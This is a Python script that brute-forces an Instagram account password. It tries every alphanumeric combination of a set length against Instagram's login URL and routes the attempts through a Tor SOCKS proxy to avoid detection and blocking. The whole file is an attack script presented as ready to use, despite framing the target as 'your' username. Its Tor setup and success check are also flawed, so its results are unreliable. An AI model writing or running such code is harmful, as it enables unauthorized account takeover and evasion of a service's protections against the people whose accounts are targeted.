import itertools
import requests
import socks
import socket
import time

def brute_force_attack(username, password_length):
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    passwords = itertools.product(characters, repeat=password_length)
    for password in passwords:
        password = ''.join(password)
        try:
            # Creating a new Tor connection for each attempt
            with socks.socksocket() as s:
                s.set_proxy(socks.SOCKS5, "localhost", 9050)
                socket.socket = s
                
                # Sending a request with a timeout of 5 seconds
                response = requests.post("https://instagram.com/login", data={"username": username, "password": password}, timeout=5)
                
                # Checking if the password is correct
                if "incorrect" not in response.text:
                    print("Password found:", password)
                    return password
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
            print("Connection timed out.")
            continue
        finally:
            # Sleep for a moment to be gentle with the server
            time.sleep(0.5)
    print("Password not found.")

# Usage example
username = "your_instagram_username"
password_length = 8  # Adjust this based on the expected length of your password
brute_force_attack(username, password_length)

